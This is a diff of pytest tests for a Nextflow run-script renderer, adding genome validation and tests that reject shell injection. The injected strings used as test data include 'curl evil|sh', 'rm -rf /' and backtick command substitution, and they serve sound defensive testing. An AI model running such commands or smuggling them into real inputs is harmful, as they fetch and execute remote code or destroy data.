@@ -38,7 +38,7 @@ def test_sanitize_job_name_strips_shell_chars():
 def test_render_substitutes_all_slots_and_no_tokens_left():
     script = render_run_script(
         job_name="nfcore_rnaseq", pipeline="nf-core/rnaseq", revision="3.16.1",
-        run_dir="/net/x/runs/nfcore_rnaseq_260709",
+        run_dir="/net/x/runs/nfcore_rnaseq_260709", genome="GRCm39",
         work_dir="/net/x/work/nfcore_rnaseq", singularity_cache="/net/x/singularity_cache",
         resources={},
     )
@@ -51,7 +51,7 @@ def test_render_substitutes_all_slots_and_no_tokens_left():
     assert "cd /net/x/runs/nfcore_rnaseq_260709" in script
     assert "nextflow run nf-core/rnaseq -r 3.16.1 -profile singularity" in script
     assert "--input samplesheet.csv" in script
-    assert "--genome GRCh38" in script
+    assert "--genome GRCm39" in script          # threaded, not hardcoded
     assert "-w /net/x/work/nfcore_rnaseq" in script
     assert "export NXF_SINGULARITY_CACHEDIR=/net/x/singularity_cache" in script
     assert "{{" not in script and "}}" not in script
@@ -73,4 +73,24 @@ def test_validate_revision_rejects_shell_metacharacters():
 def test_render_run_script_rejects_injected_revision():
     with pytest.raises(ValueError):
         render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="x; curl evil|sh",
-                          run_dir="/r", work_dir="/w", singularity_cache="/c", resources={})
+                          run_dir="/r", work_dir="/w", singularity_cache="/c", genome="GRCh38", resources={})
+
+
+def test_validate_genome_accepts_igenomes_keys():
+    from chat_nextseek.luria.run_script import validate_genome
+    for g in ("GRCh38", "GRCm39", "R64-1-1", "WBcel235", "Mmul_10"):
+        assert validate_genome(g) == g
+
+
+def test_validate_genome_rejects_injection():
+    from chat_nextseek.luria.run_script import validate_genome
+    for bad in ("GRCh38; rm -rf /", "x`id`", "a b", "", "g\n"):
+        with pytest.raises(ValueError):
+            validate_genome(bad)
+
+
+def test_render_run_script_rejects_injected_genome():
+    with pytest.raises(ValueError):
+        render_run_script(job_name="j", pipeline="nf-core/rnaseq", revision="3.16.1",
+                          run_dir="/r", work_dir="/w", singularity_cache="/c",
+                          genome="GRCh38; curl evil|sh", resources={})
